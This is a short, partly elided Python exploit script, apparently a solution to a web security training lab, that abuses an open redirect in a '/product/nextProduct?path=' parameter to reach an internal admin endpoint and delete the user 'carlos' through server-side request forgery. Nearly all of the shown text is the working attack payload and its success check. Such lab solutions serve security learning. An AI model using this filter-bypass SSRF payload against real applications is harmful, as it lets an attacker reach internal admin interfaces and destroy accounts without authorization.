...
def delete_user(s, url):
    ...
    del_user_payload = '/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos'
    ...
    if(req.status_code == 504 or req.status_code != 200):
        ...
        sys.exit(-1)
    elif(req.status_code == 200 and 'User deleted successfully!' in req.text):
...
def main():
	...
	print("\033[36m[+] SSRF with filter bypass via open redirection vulnerability deleting carlos user...")
